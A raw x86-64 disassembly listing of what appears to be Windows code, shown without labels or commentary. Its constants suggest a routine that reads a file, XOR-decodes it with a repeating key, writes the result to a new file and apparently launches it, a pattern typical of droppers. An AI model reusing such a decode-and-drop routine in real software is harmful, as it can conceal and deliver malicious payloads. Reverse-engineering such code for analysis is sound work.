   2dc491d84:	e8 07 fa 01 00       	call   0x2dc4b1790
   2dc491d89:	48 8d ac 24 10 03 00 	lea    0x310(%rsp),%rbp
   2dc491d90:	00 
   2dc491d91:	48 89 c7             	mov    %rax,%rdi
   2dc491d94:	48 89 ac 24 00 03 00 	mov    %rbp,0x300(%rsp)
   2dc491d9b:	00 
   2dc491d9c:	48 8b 00             	mov    (%rax),%rax
   2dc491d9f:	4c 8d 6f 10          	lea    0x10(%rdi),%r13
   2dc491da3:	48 8b 57 08          	mov    0x8(%rdi),%rdx
   2dc491da7:	4c 39 e8             	cmp    %r13,%rax
   2dc491daa:	0f 84 f0 04 00 00    	je     0x2dc4922a0
   2dc491db0:	48 89 84 24 00 03 00 	mov    %rax,0x300(%rsp)
   2dc491db7:	00 
   2dc491db8:	48 8b 47 10          	mov    0x10(%rdi),%rax
   2dc491dbc:	48 89 84 24 10 03 00 	mov    %rax,0x310(%rsp)
   2dc491dc3:	00 
   2dc491dc4:	48 89 94 24 08 03 00 	mov    %rdx,0x308(%rsp)
   2dc491dcb:	00 
   2dc491dcc:	45 31 f6             	xor    %r14d,%r14d
   2dc491dcf:	48 b8 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rax
   2dc491dd6:	ff ff 1f 
   2dc491dd9:	48 c7 47 08 00 00 00 	movq   $0x0,0x8(%rdi)
   2dc491de0:	00 
   2dc491de1:	4c 8b 84 24 08 03 00 	mov    0x308(%rsp),%r8
   2dc491de8:	00 
   2dc491de9:	48 2b 84 24 18 01 00 	sub    0x118(%rsp),%rax
   2dc491df0:	00 
   2dc491df1:	4c 89 2f             	mov    %r13,(%rdi)
   2dc491df4:	66 44 89 77 10       	mov    %r14w,0x10(%rdi)
   2dc491df9:	48 8b 94 24 00 03 00 	mov    0x300(%rsp),%rdx
   2dc491e00:	00 
   2dc491e01:	4c 39 c0             	cmp    %r8,%rax
   2dc491e04:	0f 82 a4 17 00 00    	jb     0x2dc4935ae
   2dc491e0a:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   2dc491e0f:	e8 8c 19 02 00       	call   0x2dc4b37a0
   2dc491e14:	48 8b 8c 24 00 03 00 	mov    0x300(%rsp),%rcx
   2dc491e1b:	00 
   2dc491e1c:	48 39 e9             	cmp    %rbp,%rcx
   2dc491e1f:	74 12                	je     0x2dc491e33
   2dc491e21:	48 8b 84 24 10 03 00 	mov    0x310(%rsp),%rax
   2dc491e28:	00 
   2dc491e29:	48 8d 54 00 02       	lea    0x2(%rax,%rax,1),%rdx
   2dc491e2e:	e8 4d 3e 02 00       	call   0x2dc4b5c80
   2dc491e33:	48 8b 8c 24 90 02 00 	mov    0x290(%rsp),%rcx
   2dc491e3a:	00 
   2dc491e3b:	48 39 f1             	cmp    %rsi,%rcx
   2dc491e3e:	74 12                	je     0x2dc491e52
   2dc491e40:	48 8b 84 24 a0 02 00 	mov    0x2a0(%rsp),%rax
   2dc491e47:	00 
   2dc491e48:	48 8d 54 00 02       	lea    0x2(%rax,%rax,1),%rdx
   2dc491e4d:	e8 2e 3e 02 00       	call   0x2dc4b5c80
   2dc491e52:	48 8b 8c 24 10 01 00 	mov    0x110(%rsp),%rcx
   2dc491e59:	00 
   2dc491e5a:	48 85 c9             	test   %rcx,%rcx
   2dc491e5d:	0f 84 7d 01 00 00    	je     0x2dc491fe0
   2dc491e63:	48 8b 05 c6 46 03 00 	mov    0x346c6(%rip),%rax        # 0x2dc4c6530
   2dc491e6a:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   2dc491e6f:	ff d0                	call   *%rax
   2dc491e71:	83 f8 ff             	cmp    $0xffffffff,%eax
   2dc491e74:	0f 84 4e 01 00 00    	je     0x2dc491fc8
   2dc491e7a:	a8 10                	test   $0x10,%al
   2dc491e7c:	0f 85 46 01 00 00    	jne    0x2dc491fc8
   2dc491e82:	48 89 d9             	mov    %rbx,%rcx
   2dc491e85:	e8 06 f8 ff ff       	call   0x2dc491690
   2dc491e8a:	48 8d 84 24 00 03 00 	lea    0x300(%rsp),%rax
   2dc491e91:	00 
   2dc491e92:	48 89 c1             	mov    %rax,%rcx
   2dc491e95:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   2dc491e9a:	e8 a1 fb ff ff       	call   0x2dc491a40
   2dc491e9f:	48 8b 8c 24 00 03 00 	mov    0x300(%rsp),%rcx
   2dc491ea6:	00 
   2dc491ea7:	e8 e4 f7 ff ff       	call   0x2dc491690
   2dc491eac:	48 8b 05 f5 46 03 00 	mov    0x346f5(%rip),%rax        # 0x2dc4c65a8
   2dc491eb3:	b9 f4 01 00 00       	mov    $0x1f4,%ecx
   2dc491eb8:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   2dc491ebf:	00 
   2dc491ec0:	ff d0                	call   *%rax
   2dc491ec2:	48 8b 8c 24 00 03 00 	mov    0x300(%rsp),%rcx
   2dc491ec9:	00 
   2dc491eca:	48 39 e9             	cmp    %rbp,%rcx
   2dc491ecd:	74 12                	je     0x2dc491ee1
   2dc491ecf:	48 8b 84 24 10 03 00 	mov    0x310(%rsp),%rax
   2dc491ed6:	00 
   2dc491ed7:	48 8d 54 00 02       	lea    0x2(%rax,%rax,1),%rdx
   2dc491edc:	e8 9f 3d 02 00       	call   0x2dc4b5c80
   2dc491ee1:	48 8b 8c 24 10 01 00 	mov    0x110(%rsp),%rcx
   2dc491ee8:	00 
   2dc491ee9:	48 85 c9             	test   %rcx,%rcx
   2dc491eec:	0f 84 ee 00 00 00    	je     0x2dc491fe0
   2dc491ef2:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   2dc491ef9:	00 
   2dc491efa:	45 31 c9             	xor    %r9d,%r9d
   2dc491efd:	4c 8b 35 ec 45 03 00 	mov    0x345ec(%rip),%r14        # 0x2dc4c64f0
   2dc491f04:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   2dc491f0a:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   2dc491f11:	00 00 
   2dc491f13:	ba 00 00 00 80       	mov    $0x80000000,%edx
   2dc491f18:	c7 44 24 20 03 00 00 	movl   $0x3,0x20(%rsp)
   2dc491f1f:	00 
   2dc491f20:	41 ff d6             	call   *%r14
   2dc491f23:	49 89 c5             	mov    %rax,%r13
   2dc491f26:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   2dc491f2a:	0f 84 98 00 00 00    	je     0x2dc491fc8
   2dc491f30:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   2dc491f35:	48 89 c1             	mov    %rax,%rcx
   2dc491f38:	ff 15 fa 45 03 00    	call   *0x345fa(%rip)        # 0x2dc4c6538
   2dc491f3e:	85 c0                	test   %eax,%eax
   2dc491f40:	0f 84 aa 13 00 00    	je     0x2dc4932f0
   2dc491f46:	48 8b 8c 24 00 03 00 	mov    0x300(%rsp),%rcx
   2dc491f4d:	00 
   2dc491f4e:	e8 3d 3d 02 00       	call   0x2dc4b5c90
   2dc491f53:	48 89 c7             	mov    %rax,%rdi
   2dc491f56:	4d 89 e1             	mov    %r12,%r9
   2dc491f59:	48 89 c2             	mov    %rax,%rdx
   2dc491f5c:	4c 89 e9             	mov    %r13,%rcx
   2dc491f5f:	c7 84 24 90 02 00 00 	movl   $0x0,0x290(%rsp)
   2dc491f66:	00 00 00 00 
   2dc491f6a:	44 8b 84 24 00 03 00 	mov    0x300(%rsp),%r8d
   2dc491f71:	00 
   2dc491f72:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   2dc491f79:	00 00 
   2dc491f7b:	ff 15 ff 45 03 00    	call   *0x345ff(%rip)        # 0x2dc4c6580
   2dc491f81:	48 8b 15 58 45 03 00 	mov    0x34558(%rip),%rdx        # 0x2dc4c64e0
   2dc491f88:	89 44 24 58          	mov    %eax,0x58(%rsp)
   2dc491f8c:	4c 89 e9             	mov    %r13,%rcx
   2dc491f8f:	48 89 94 24 a0 00 00 	mov    %rdx,0xa0(%rsp)
   2dc491f96:	00 
   2dc491f97:	ff d2                	call   *%rdx
   2dc491f99:	44 8b 6c 24 58       	mov    0x58(%rsp),%r13d
   2dc491f9e:	45 85 ed             	test   %r13d,%r13d
   2dc491fa1:	74 18                	je     0x2dc491fbb
   2dc491fa3:	4c 8b ac 24 00 03 00 	mov    0x300(%rsp),%r13
   2dc491faa:	00 
   2dc491fab:	8b 84 24 90 02 00 00 	mov    0x290(%rsp),%eax
   2dc491fb2:	4c 39 e8             	cmp    %r13,%rax
   2dc491fb5:	0f 84 25 03 00 00    	je     0x2dc4922e0
   2dc491fbb:	48 89 f9             	mov    %rdi,%rcx
   2dc491fbe:	e8 9d 3c 02 00       	call   0x2dc4b5c60
   2dc491fc3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   2dc491fc8:	48 8b 8c 24 10 01 00 	mov    0x110(%rsp),%rcx
   2dc491fcf:	00 
   2dc491fd0:	4c 39 f9             	cmp    %r15,%rcx
   2dc491fd3:	75 0d                	jne    0x2dc491fe2
   2dc491fd5:	eb 1e                	jmp    0x2dc491ff5
   2dc491fd7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   2dc491fde:	00 00 
   2dc491fe0:	31 c9                	xor    %ecx,%ecx
   2dc491fe2:	48 8b 84 24 20 01 00 	mov    0x120(%rsp),%rax
   2dc491fe9:	00 
   2dc491fea:	48 8d 54 00 02       	lea    0x2(%rax,%rax,1),%rdx
   2dc491fef:	e8 8c 3c 02 00       	call   0x2dc4b5c80
   2dc491ff4:	90                   	nop
   2dc491ff5:	48 81 c4 78 03 00 00 	add    $0x378,%rsp
   2dc491ffc:	5b                   	pop    %rbx
   2dc491ffd:	5e                   	pop    %rsi
   2dc491ffe:	5f                   	pop    %rdi
   2dc491fff:	5d                   	pop    %rbp
   2dc492000:	41 5c                	pop    %r12
   2dc492002:	41 5d                	pop    %r13
   2dc492004:	41 5e                	pop    %r14
   2dc492006:	41 5f                	pop    %r15
   2dc492008:	c3                   	ret
   2dc492009:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   2dc492010:	48 8d 1d 89 20 03 00 	lea    0x32089(%rip),%rbx        # 0x2dc4c40a0
   2dc492017:	48 8d b4 24 50 02 00 	lea    0x250(%rsp),%rsi
   2dc49201e:	00 
   2dc49201f:	48 8d 84 24 60 02 00 	lea    0x260(%rsp),%rax
   2dc492026:	00 
   2dc492027:	48 89 d9             	mov    %rbx,%rcx
   2dc49202a:	48 89 74 24 68       	mov    %rsi,0x68(%rsp)
   2dc49202f:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   2dc492034:	48 89 84 24 50 02 00 	mov    %rax,0x250(%rsp)
   2dc49203b:	00 
   2dc49203c:	e8 b7 2c 01 00       	call   0x2dc4a4cf8
   2dc492041:	48 89 f1             	mov    %rsi,%rcx
   2dc492044:	48 89 da             	mov    %rbx,%rdx
   2dc492047:	48 8d 35 e2 60 02 00 	lea    0x260e2(%rip),%rsi        # 0x2dc4b8130
   2dc49204e:	4c 8d 04 43          	lea    (%rbx,%rax,2),%r8
   2dc492052:	e8 29 f7 ff ff       	call   0x2dc491780
   2dc492057:	48 89 f1             	mov    %rsi,%rcx
   2dc49205a:	e8 99 2c 01 00       	call   0x2dc4a4cf8
   2dc49205f:	49 89 c0             	mov    %rax,%r8
   2dc492062:	48 b8 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rax
   2dc492069:	ff ff 1f 
   2dc49206c:	48 2b 84 24 58 02 00 	sub    0x258(%rsp),%rax
   2dc492073:	00 
   2dc492074:	4c 39 c0             	cmp    %r8,%rax
   2dc492077:	0f 82 3d 15 00 00    	jb     0x2dc4935ba
   2dc49207d:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   2dc492082:	48 89 f2             	mov    %rsi,%rdx
   2dc492085:	e8 16 17 02 00       	call   0x2dc4b37a0
   2dc49208a:	31 c0                	xor    %eax,%eax
   2dc49208c:	48 8d bc 24 08 03 00 	lea    0x308(%rsp),%rdi
   2dc492093:	00 
   2dc492094:	b9 0d 00 00 00       	mov    $0xd,%ecx
   2dc492099:	4c 8b a4 24 50 02 00 	mov    0x250(%rsp),%r12
   2dc4920a0:	00 
   2dc4920a1:	f3 48 ab             	rep stos %rax,(%rdi)
   2dc4920a4:	48 8b 05 5d 61 02 00 	mov    0x2615d(%rip),%rax        # 0x2dc4b8208
   2dc4920ab:	48 8d 35 02 60 02 00 	lea    0x26002(%rip),%rsi        # 0x2dc4b80b4
   2dc4920b2:	48 8d 2d 89 60 02 00 	lea    0x26089(%rip),%rbp        # 0x2dc4b8142
   2dc4920b9:	66 48 0f 6e c6       	movq   %rsi,%xmm0
   2dc4920be:	48 89 e9             	mov    %rbp,%rcx
   2dc4920c1:	48 8b bc 24 58 02 00 	mov    0x258(%rsp),%rdi
   2dc4920c8:	00 
   2dc4920c9:	4c 8d ac 24 70 02 00 	lea    0x270(%rsp),%r13
   2dc4920d0:	00 
   2dc4920d1:	48 89 84 24 00 03 00 	mov    %rax,0x300(%rsp)
   2dc4920d8:	00 
   2dc4920d9:	48 8d 05 40 60 02 00 	lea    0x26040(%rip),%rax        # 0x2dc4b8120
   2dc4920e0:	4c 8d b4 24 80 02 00 	lea    0x280(%rsp),%r14
   2dc4920e7:	00 
   2dc4920e8:	66 48 0f 6e c8       	movq   %rax,%xmm1
   2dc4920ed:	66 0f 6c c1          	punpcklqdq %xmm1,%xmm0
   2dc4920f1:	0f 29 84 24 10 03 00 	movaps %xmm0,0x310(%rsp)
   2dc4920f8:	00 
   2dc4920f9:	e8 fa 2b 01 00       	call   0x2dc4a4cf8
   2dc4920fe:	4c 89 e9             	mov    %r13,%rcx
   2dc492101:	4c 89 b4 24 70 02 00 	mov    %r14,0x270(%rsp)
   2dc492108:	00 
   2dc492109:	48 c7 84 24 78 02 00 	movq   $0x0,0x278(%rsp)
   2dc492110:	00 00 00 00 00 
   2dc492115:	48 89 c6             	mov    %rax,%rsi
   2dc492118:	31 c0                	xor    %eax,%eax
   2dc49211a:	48 8d 14 37          	lea    (%rdi,%rsi,1),%rdx
   2dc49211e:	66 89 84 24 80 02 00 	mov    %ax,0x280(%rsp)
   2dc492125:	00 
   2dc492126:	e8 35 15 02 00       	call   0x2dc4b3660
   2dc49212b:	48 b8 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rax
   2dc492132:	ff ff 1f 
   2dc492135:	48 2b 84 24 78 02 00 	sub    0x278(%rsp),%rax
   2dc49213c:	00 
   2dc49213d:	48 39 f0             	cmp    %rsi,%rax
   2dc492140:	0f 82 80 14 00 00    	jb     0x2dc4935c6
   2dc492146:	49 89 f0             	mov    %rsi,%r8
   2dc492149:	48 89 ea             	mov    %rbp,%rdx
   2dc49214c:	4c 89 e9             	mov    %r13,%rcx
   2dc49214f:	e8 4c 16 02 00       	call   0x2dc4b37a0
   2dc492154:	48 b8 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rax
   2dc49215b:	ff ff 1f 
   2dc49215e:	48 2b 84 24 78 02 00 	sub    0x278(%rsp),%rax
   2dc492165:	00 
   2dc492166:	48 39 f8             	cmp    %rdi,%rax
   2dc492169:	0f 82 63 14 00 00    	jb     0x2dc4935d2
   2dc49216f:	49 89 f8             	mov    %rdi,%r8
   2dc492172:	4c 89 e2             	mov    %r12,%rdx
   2dc492175:	4c 89 e9             	mov    %r13,%rcx
   2dc492178:	e8 23 16 02 00       	call   0x2dc4b37a0
   2dc49217d:	48 8d 35 c8 5f 02 00 	lea    0x25fc8(%rip),%rsi        # 0x2dc4b814c
   2dc492184:	48 89 f1             	mov    %rsi,%rcx
   2dc492187:	e8 6c 2b 01 00       	call   0x2dc4a4cf8
   2dc49218c:	49 89 c0             	mov    %rax,%r8
   2dc49218f:	48 b8 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rax
   2dc492196:	ff ff 1f 
   2dc492199:	48 2b 84 24 78 02 00 	sub    0x278(%rsp),%rax
   2dc4921a0:	00 
   2dc4921a1:	4c 39 c0             	cmp    %r8,%rax
   2dc4921a4:	0f 82 34 14 00 00    	jb     0x2dc4935de
   2dc4921aa:	48 89 f2             	mov    %rsi,%rdx
   2dc4921ad:	4c 89 e9             	mov    %r13,%rcx
   2dc4921b0:	e8 eb 15 02 00       	call   0x2dc4b37a0
   2dc4921b5:	48 8d b4 24 a0 02 00 	lea    0x2a0(%rsp),%rsi
   2dc4921bc:	00 
   2dc4921bd:	48 89 c7             	mov    %rax,%rdi
   2dc4921c0:	48 89 b4 24 90 02 00 	mov    %rsi,0x290(%rsp)
   2dc4921c7:	00 
   2dc4921c8:	48 8b 00             	mov    (%rax),%rax
   2dc4921cb:	48 8d 6f 10          	lea    0x10(%rdi),%rbp
   2dc4921cf:	48 8b 57 08          	mov    0x8(%rdi),%rdx
   2dc4921d3:	48 39 e8             	cmp    %rbp,%rax
   2dc4921d6:	0f 84 e4 00 00 00    	je     0x2dc4922c0
   2dc4921dc:	48 89 84 24 90 02 00 	mov    %rax,0x290(%rsp)
   2dc4921e3:	00 
   2dc4921e4:	48 8b 47 10          	mov    0x10(%rdi),%rax
   2dc4921e8:	48 89 84 24 a0 02 00 	mov    %rax,0x2a0(%rsp)
   2dc4921ef:	00 
   2dc4921f0:	48 89 94 24 98 02 00 	mov    %rdx,0x298(%rsp)
   2dc4921f7:	00 
   2dc4921f8:	45 31 ff             	xor    %r15d,%r15d
   2dc4921fb:	48 89 2f             	mov    %rbp,(%rdi)
   2dc4921fe:	48 8b 8c 24 90 02 00 	mov    0x290(%rsp),%rcx
   2dc492205:	00 
   2dc492206:	48 c7 47 08 00 00 00 	movq   $0x0,0x8(%rdi)
   2dc49220d:	00 
   2dc49220e:	66 44 89 7f 10       	mov    %r15w,0x10(%rdi)
   2dc492213:	48 89 8c 24 20 03 00 	mov    %rcx,0x320(%rsp)
   2dc49221a:	00 
   2dc49221b:	48 39 f1             	cmp    %rsi,%rcx
   2dc49221e:	74 12                	je     0x2dc492232
   2dc492220:	48 8b 84 24 a0 02 00 	mov    0x2a0(%rsp),%rax
   2dc492227:	00 
   2dc492228:	48 8d 54 00 02       	lea    0x2(%rax,%rax,1),%rdx
   2dc49222d:	e8 4e 3a 02 00       	call   0x2dc4b5c80
   2dc492232:	48 8b 8c 24 70 02 00 	mov    0x270(%rsp),%rcx
   2dc492239:	00 
   2dc49223a:	4c 39 f1             	cmp    %r14,%rcx
   2dc49223d:	74 12                	je     0x2dc492251
   2dc49223f:	48 8b 84 24 80 02 00 	mov    0x280(%rsp),%rax
   2dc492246:	00 
   2dc492247:	48 8d 54 00 02       	lea    0x2(%rax,%rax,1),%rdx
   2dc49224c:	e8 2f 3a 02 00       	call   0x2dc4b5c80
   2dc492251:	48 89 9c 24 28 03 00 	mov    %rbx,0x328(%rsp)
   2dc492258:	00 
   2dc492259:	48 8d 8c 24 00 03 00 	lea    0x300(%rsp),%rcx
   2dc492260:	00 
   2dc492261:	c7 84 24 30 03 00 00 	movl   $0x1,0x330(%rsp)
   2dc492268:	01 00 00 00 
   2dc49226c:	ff 15 ce 45 03 00    	call   *0x345ce(%rip)        # 0x2dc4c6840
   2dc492272:	48 8b 8c 24 50 02 00 	mov    0x250(%rsp),%rcx
   2dc492279:	00 
   2dc49227a:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   2dc49227f:	48 39 c1             	cmp    %rax,%rcx
   2dc492282:	0f 84 6d fd ff ff    	je     0x2dc491ff5
   2dc492288:	48 8b 84 24 60 02 00 	mov    0x260(%rsp),%rax
   2dc49228f:	00 
   2dc492290:	48 8d 54 00 02       	lea    0x2(%rax,%rax,1),%rdx
   2dc492295:	e8 e6 39 02 00       	call   0x2dc4b5c80
   2dc49229a:	e9 56 fd ff ff       	jmp    0x2dc491ff5
   2dc49229f:	90                   	nop
   2dc4922a0:	4c 8d 44 12 02       	lea    0x2(%rdx,%rdx,1),%r8
   2dc4922a5:	48 89 e9             	mov    %rbp,%rcx
   2dc4922a8:	4c 89 ea             	mov    %r13,%rdx
   2dc4922ab:	e8 30 2b 01 00       	call   0x2dc4a4de0
   2dc4922b0:	48 8b 57 08          	mov    0x8(%rdi),%rdx
   2dc4922b4:	e9 0b fb ff ff       	jmp    0x2dc491dc4
   2dc4922b9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   2dc4922c0:	4c 8d 44 12 02       	lea    0x2(%rdx,%rdx,1),%r8
   2dc4922c5:	48 89 f1             	mov    %rsi,%rcx
   2dc4922c8:	48 89 ea             	mov    %rbp,%rdx
   2dc4922cb:	e8 10 2b 01 00       	call   0x2dc4a4de0
   2dc4922d0:	48 8b 57 08          	mov    0x8(%rdi),%rdx
   2dc4922d4:	e9 17 ff ff ff       	jmp    0x2dc4921f0
   2dc4922d9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   2dc4922e0:	48 8d 0d 7f 5e 02 00 	lea    0x25e7f(%rip),%rcx        # 0x2dc4b8166
   2dc4922e7:	e8 0c 2a 01 00       	call   0x2dc4a4cf8
   2dc4922ec:	49 89 c0             	mov    %rax,%r8
   2dc4922ef:	4d 85 ed             	test   %r13,%r13
   2dc4922f2:	74 3b                	je     0x2dc49232f
   2dc4922f4:	48 85 c0             	test   %rax,%rax
   2dc4922f7:	74 36                	je     0x2dc49232f
   2dc4922f9:	80 37 54             	xorb   $0x54,(%rdi)
   2dc4922fc:	49 83 fd 01          	cmp    $0x1,%r13
   2dc492300:	74 2d                	je     0x2dc49232f
   2dc492302:	b9 01 00 00 00       	mov    $0x1,%ecx
   2dc492307:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   2dc49230e:	00 00 
   2dc492310:	48 89 c8             	mov    %rcx,%rax
   2dc492313:	31 d2                	xor    %edx,%edx
   2dc492315:	49 f7 f0             	div    %r8
   2dc492318:	48 8d 05 47 5e 02 00 	lea    0x25e47(%rip),%rax        # 0x2dc4b8166
   2dc49231f:	0f b7 04 50          	movzwl (%rax,%rdx,2),%eax
   2dc492323:	30 04 0f             	xor    %al,(%rdi,%rcx,1)
   2dc492326:	48 83 c1 01          	add    $0x1,%rcx
   2dc49232a:	49 39 cd             	cmp    %rcx,%r13
   2dc49232d:	75 e1                	jne    0x2dc492310
   2dc49232f:	48 8d 84 24 30 01 00 	lea    0x130(%rsp),%rax
   2dc492336:	00 
   2dc492337:	48 89 c1             	mov    %rax,%rcx
   2dc49233a:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   2dc49233f:	e8 fc f6 ff ff       	call   0x2dc491a40
   2dc492344:	48 8d 84 24 50 01 00 	lea    0x150(%rsp),%rax
   2dc49234b:	00 
   2dc49234c:	48 8b 54 24 78       	mov    0x78(%rsp),%rdx
   2dc492351:	4c 8d 05 16 5e 02 00 	lea    0x25e16(%rip),%r8        # 0x2dc4b816e
   2dc492358:	48 89 c1             	mov    %rax,%rcx
   2dc49235b:	48 89 84 24 b0 00 00 	mov    %rax,0xb0(%rsp)
   2dc492362:	00 
   2dc492363:	e8 38 f5 ff ff       	call   0x2dc4918a0
   2dc492368:	48 8b 8c 24 50 01 00 	mov    0x150(%rsp),%rcx
   2dc49236f:	00 
   2dc492370:	48 85 c9             	test   %rcx,%rcx
   2dc492373:	0f 84 8f 00 00 00    	je     0x2dc492408
   2dc492379:	4d 85 ed             	test   %r13,%r13
   2dc49237c:	0f 84 86 00 00 00    	je     0x2dc492408
   2dc492382:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   2dc492389:	00 00 
   2dc49238b:	45 31 c9             	xor    %r9d,%r9d
   2dc49238e:	45 31 c0             	xor    %r8d,%r8d
   2dc492391:	ba 00 00 00 40       	mov    $0x40000000,%edx
   2dc492396:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   2dc49239d:	00 
   2dc49239e:	c7 44 24 20 02 00 00 	movl   $0x2,0x20(%rsp)
   2dc4923a5:	00 
   2dc4923a6:	41 ff d6             	call   *%r14
   2dc4923a9:	49 89 c6             	mov    %rax,%r14
   2dc4923ac:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   2dc4923b0:	74 56                	je     0x2dc492408
   2dc4923b2:	4c 8b 4c 24 60       	mov    0x60(%rsp),%r9
   2dc4923b7:	45 89 e8             	mov    %r13d,%r8d
   2dc4923ba:	48 89 fa             	mov    %rdi,%rdx
   2dc4923bd:	48 89 c1             	mov    %rax,%rcx
   2dc4923c0:	c7 84 24 00 03 00 00 	movl   $0x0,0x300(%rsp)
   2dc4923c7:	00 00 00 00 
   2dc4923cb:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   2dc4923d2:	00 00 
   2dc4923d4:	ff 15 f6 41 03 00    	call   *0x341f6(%rip)        # 0x2dc4c65d0
   2dc4923da:	89 44 24 58          	mov    %eax,0x58(%rsp)
   2dc4923de:	48 8b 94 24 a0 00 00 	mov    0xa0(%rsp),%rdx
   2dc4923e5:	00 
   2dc4923e6:	4c 89 f1             	mov    %r14,%rcx
   2dc4923e9:	ff d2                	call   *%rdx
   2dc4923eb:	44 8b 5c 24 58       	mov    0x58(%rsp),%r11d
   2dc4923f0:	45 85 db             	test   %r11d,%r11d
   2dc4923f3:	74 13                	je     0x2dc492408
   2dc4923f5:	8b 84 24 00 03 00 00 	mov    0x300(%rsp),%eax
   2dc4923fc:	49 39 c5             	cmp    %rax,%r13
   2dc4923ff:	74 77                	je     0x2dc492478
   2dc492401:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   2dc492408:	48 89 f9             	mov    %rdi,%rcx
   2dc49240b:	e8 50 38 02 00       	call   0x2dc4b5c60
   2dc492410:	48 8b 8c 24 50 01 00 	mov    0x150(%rsp),%rcx
   2dc492417:	00 
   2dc492418:	48 8d 84 24 60 01 00 	lea    0x160(%rsp),%rax
   2dc49241f:	00 
   2dc492420:	48 39 c1             	cmp    %rax,%rcx
   2dc492423:	74 12                	je     0x2dc492437
   2dc492425:	48 8b 84 24 60 01 00 	mov    0x160(%rsp),%rax
   2dc49242c:	00 
   2dc49242d:	48 8d 54 00 02       	lea    0x2(%rax,%rax,1),%rdx
   2dc492432:	e8 49 38 02 00       	call   0x2dc4b5c80
   2dc492437:	48 8b 8c 24 30 01 00 	mov    0x130(%rsp),%rcx
   2dc49243e:	00 
   2dc49243f:	48 8d 84 24 40 01 00 	lea    0x140(%rsp),%rax
   2dc492446:	00 
   2dc492447:	48 39 c1             	cmp    %rax,%rcx
   2dc49244a:	0f 84 78 fb ff ff    	je     0x2dc491fc8
   2dc492450:	48 8b 84 24 40 01 00 	mov    0x140(%rsp),%rax
   2dc492457:	00 
   2dc492458:	48 8d 54 00 02       	lea    0x2(%rax,%rax,1),%rdx
   2dc49245d:	e8 1e 38 02 00       	call   0x2dc4b5c80
   2dc492462:	48 8b 8c 24 10 01 00 	mov    0x110(%rsp),%rcx
   2dc492469:	00 
   2dc49246a:	4c 39 f9             	cmp    %r15,%rcx
   2dc49246d:	0f 85 6f fb ff ff    	jne    0x2dc491fe2
   2dc492473:	e9 7d fb ff ff       	jmp    0x2dc491ff5
   2dc492478:	48 89 f9             	mov    %rdi,%rcx
   2dc49247b:	e8 e0 37 02 00       	call   0x2dc4b5c60
   2dc492480:	48 89 d9             	mov    %rbx,%rcx
   2dc492483:	48 89 ac 24 00 03 00 	mov    %rbp,0x300(%rsp)
   2dc49248a:	00 
   2dc49248b:	e8 68 28 01 00       	call   0x2dc4a4cf8
   2dc492490:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   2dc492495:	48 89 da             	mov    %rbx,%rdx
   2dc492498:	4c 8d 04 43          	lea    (%rbx,%rax,2),%r8
   2dc49249c:	48 89 f9             	mov    %rdi,%rcx
   2dc49249f:	e8 dc f2 ff ff       	call   0x2dc491780
   2dc4924a4:	48 8d 84 24 70 01 00 	lea    0x170(%rsp),%rax
   2dc4924ab:	00 
   2dc4924ac:	4c 8d 05 d5 5c 02 00 	lea    0x25cd5(%rip),%r8        # 0x2dc4b8188
   2dc4924b3:	48 89 fa             	mov    %rdi,%rdx
   2dc4924b6:	48 89 c1             	mov    %rax,%rcx
   2dc4924b9:	48 89 84 24 c0 00 00 	mov    %rax,0xc0(%rsp)
   2dc4924c0:	00 
   2dc4924c1:	e8 da f3 ff ff       	call   0x2dc4918a0
   2dc4924c6:	48 8b 8c 24 00 03 00 	mov    0x300(%rsp),%rcx
   2dc4924cd:	00 
   2dc4924ce:	48 39 e9             	cmp    %rbp,%rcx
   2dc4924d1:	74 12                	je     0x2dc4924e5
   2dc4924d3:	48 8b 84 24 10 03 00 	mov    0x310(%rsp),%rax
   2dc4924da:	00 
   2dc4924db:	48 8d 54 00 02       	lea    0x2(%rax,%rax,1),%rdx
   2dc4924e0:	e8 9b 37 02 00       	call   0x2dc4b5c80
   2dc4924e5:	48 8b 8c 24 70 01 00 	mov    0x170(%rsp),%rcx
   2dc4924ec:	00 
   2dc4924ed:	48 85 c9             	test   %rcx,%rcx
   2dc4924f0:	74 14                	je     0x2dc492506
   2dc4924f2:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   2dc4924f7:	ff d0                	call   *%rax
   2dc4924f9:	83 f8 ff             	cmp    $0xffffffff,%eax
   2dc4924fc:	74 08                	je     0x2dc492506
   2dc4924fe:	a8 10                	test   $0x10,%al
   2dc492500:	0f 84 e8 00 00 00    	je     0x2dc4925ee
   2dc492506:	48 89 d9             	mov    %rbx,%rcx
   2dc492509:	48 89 b4 24 90 02 00 	mov    %rsi,0x290(%rsp)
   2dc492510:	00 
   2dc492511:	e8 e2 27 01 00       	call   0x2dc4a4cf8
   2dc492516:	48 89 da             	mov    %rbx,%rdx
